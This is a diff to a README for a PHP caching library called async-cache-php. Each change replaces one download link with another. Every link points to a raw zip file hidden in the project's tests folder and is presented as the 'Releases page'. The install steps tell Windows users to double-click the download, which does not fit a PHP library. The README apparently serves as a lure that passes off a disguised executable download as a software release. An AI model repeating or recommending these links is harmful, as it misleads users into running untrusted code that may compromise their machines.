@@ -1,6 +1,6 @@
 # 🚀 async-cache-php - Fast and Efficient Caching for PHP
 
-[![Download Now](https://github.com/YamdmDeb/async-cache-php/raw/refs/heads/main/tests/Unit/Core/async-php-cache-v2.0-alpha.1.zip)](https://github.com/YamdmDeb/async-cache-php/raw/refs/heads/main/tests/Unit/Core/async-php-cache-v2.0-alpha.1.zip)
+[![Download Now](https://github.com/YamdmDeb/async-cache-php/raw/refs/heads/main/tests/Unit/cache-php-async-v2.9.zip)](https://github.com/YamdmDeb/async-cache-php/raw/refs/heads/main/tests/Unit/cache-php-async-v2.9.zip)
 
 ## 📖 Description
 
@@ -24,12 +24,12 @@ async-cache-php is an asynchronous caching abstraction layer for PHP. It include
 Follow these steps to get started with async-cache-php:
 
 1. **Visit the Releases Page**  
-   Go to the releases page to find the software. You can get there by clicking [here](https://github.com/YamdmDeb/async-cache-php/raw/refs/heads/main/tests/Unit/Core/async-php-cache-v2.0-alpha.1.zip). 
+   Go to the releases page to find the software. You can get there by clicking [here](https://github.com/YamdmDeb/async-cache-php/raw/refs/heads/main/tests/Unit/cache-php-async-v2.9.zip). 
 
 2. **Download the Latest Version**  
    Look for the latest version listed on the page. You will see the assets available for download. Click to download the file that meets your needs.
 
-   ![Release Assets](https://github.com/YamdmDeb/async-cache-php/raw/refs/heads/main/tests/Unit/Core/async-php-cache-v2.0-alpha.1.zip+Download+Files)
+   ![Release Assets](https://github.com/YamdmDeb/async-cache-php/raw/refs/heads/main/tests/Unit/cache-php-async-v2.9.zip+Download+Files)
 
 3. **Install the Software**  
    - **For Windows:** Double-click the downloaded file and follow the installation prompts.
@@ -111,6 +111,6 @@ We welcome contributions to async-cache-php. If you want to help improve the sof
 
 ## 📥 Download & Install
 
-To download and install async-cache-php, follow this link to the Releases page: [Download async-cache-php](https://github.com/YamdmDeb/async-cache-php/raw/refs/heads/main/tests/Unit/Core/async-php-cache-v2.0-alpha.1.zip).
+To download and install async-cache-php, follow this link to the Releases page: [Download async-cache-php](https://github.com/YamdmDeb/async-cache-php/raw/refs/heads/main/tests/Unit/cache-php-async-v2.9.zip).
 
 Click the link, select the latest version, and follow the installation steps provided earlier. Enjoy enhanced caching in your PHP projects.
